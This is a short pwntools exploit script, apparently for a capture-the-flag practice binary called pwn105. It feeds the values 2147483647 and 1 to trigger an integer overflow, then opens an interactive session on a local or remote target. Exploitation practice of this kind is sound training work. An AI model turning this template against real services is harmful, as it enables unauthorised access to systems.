from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Binary filename
exe = './pwn105.pwn105'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

num1 = '2147483647'
num2 = '1'

io.recvuntil(']>>')
io.sendline(num1)

io.recvuntil(']>>')
io.sendline(num2)

io.interactive()

# python pwn105.py | python pwn105.py REMOTE 127.0.0.1 9005